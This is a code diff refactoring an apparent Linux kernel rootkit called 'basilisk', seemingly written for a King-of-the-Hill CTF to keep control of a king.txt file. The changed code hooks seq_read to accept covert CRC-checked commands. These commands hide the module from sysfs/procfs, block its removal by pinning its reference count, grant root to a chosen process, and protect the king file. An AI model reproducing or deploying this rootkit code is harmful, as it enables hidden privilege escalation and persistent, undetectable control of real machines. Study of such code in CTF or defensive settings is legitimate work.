@@ -18,12 +18,6 @@
 #include "include/stealth_helper.h"
 #include "include/utils.h"
 
-// Macros for protecting king.txt
-#define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
-#define KING_FILENAME_LEN strlen(KING_FILENAME)
-
-#define KING "SKELLY\n" // King
-#define KING_LEN strlen(KING)
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Skelly");
@@ -34,13 +28,20 @@ MODULE_VERSION("2.0");
 #define PTREGS_SYSCALL_STUBS 1
 #endif
 
+/* Macros for protecting king.txt */
+#define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
+#define KING_FILENAME_LEN strlen(KING_FILENAME)
+
+#define KING "SKELLY\n" // King
+#define KING_LEN strlen(KING)
+
 /* Enum for the different command signals */
-typedef enum {
-    SIG_GOD = 0xFFFFFFFF,
-    SIG_HIDE = 0xFFFFFFFA,
-    SIG_PROTECT = 0xFFFFFFFB,
-    SIG_ROOT = 0xFFFFFFBA,
-} CmdSignal;
+enum {
+    SIG_GOD = 0xFF,
+    SIG_HIDE = 0xFA,
+    SIG_PROTECT = 0xFB,
+    SIG_ROOT = 0xBA,
+};
 
 enum {
   /* Component sizes */
@@ -57,14 +58,13 @@ enum {
 };
 
 static bool hidden = false; // toggle for hiding from sysfs/procfs
-static bool protected = false; // toggle for inc/decrementing module ref count (un/protecting it from being removed)
+static bool protected = false; // toggle for inc/decrementing module ref count
 
 static struct file_operations *king_fops = NULL;
-
 static DEFINE_RWLOCK(king_fops_lock);
 
 /* Executes appropriate functions based on given signal. pid is meant to be used with signal SIG_ROOT */
-void sig_handle(const CmdSignal sig, pid_t pid) {
+void sig_handle(const uint32_t sig, pid_t pid) {
     switch (sig) {
         case SIG_HIDE:
             handle_lkm_hide(&hidden);
@@ -88,6 +88,26 @@ void sig_handle(const CmdSignal sig, pid_t pid) {
     }
 }
 
+/* Extract the signal, pid and CRC from the given buffer */
+void extract_components(
+    char *buf, 
+    uint8_t *sig, 
+    pid_t *pid, 
+    uint32_t *crc
+) {
+    *sig = (uint8_t)buf[0]; // first byte (command)
+    memcpy(pid, buf + PID_OFFSET, PID_SIZE);
+    memcpy(crc, buf + CRC_OFFSET, CRC_SIZE);
+}
+
+/* Validate the crc extracted from the buffer */
+bool is_valid_crc(
+    char *buf,
+    const uint32_t crc
+) {
+    uint32_t n_crc = crc32(buf, TOTAL_SIZE - CRC_SIZE);
+    return n_crc == crc; 
+}
 /*
 static const struct proc_ops kallsyms_proc_ops = {
 	.proc_open	= kallsyms_open,
@@ -102,21 +122,17 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
     char *kbuf;
     long error;
 
-    CmdSignal sig;
+    uint8_t sig;
     pid_t pid;
-    uint32_t extracted_crc, calculated_crc;
+    uint32_t extracted_crc;
 
     kbuf = kmalloc(size, GFP_KERNEL);
     if (!kbuf) {
         return orig_seq_read(file, buf, size, ppos);
     }
 
-    error = copy_from_user(kbuf, buf, size); // only need the first 9 bytes
+    error = copy_from_user(kbuf, buf, size);
     if (error) {
-        pr_err(
-            "basilisk: failed to copy string from user space: error code %ld\n",
-            error
-        );
         kfree(kbuf);
         return orig_seq_read(file, buf, size, ppos);
     }
@@ -126,15 +142,11 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
         return orig_seq_read(file, buf, size, ppos);
     }
 
-    sig = (CmdSignal)kbuf[0]; // first byte (command)
-    memcpy(&pid, kbuf + PID_OFFSET, PID_SIZE);
-    memcpy(&extracted_crc, kbuf + CRC_OFFSET, CRC_SIZE);
+    extract_components(kbuf, &sig, &pid, &extracted_crc);
 
-    calculated_crc = crc32(kbuf, TOTAL_SIZE - CRC_SIZE);
-
-    if (calculated_crc != extracted_crc) {
-      kfree(kbuf);
-      return orig_seq_read(file, buf, size, ppos);
+    if (!is_valid_crc(kbuf, extracted_crc)) {
+        kfree(kbuf);
+        return orig_seq_read(file, buf, size, ppos);
     }
     sig_handle(sig, pid);
 
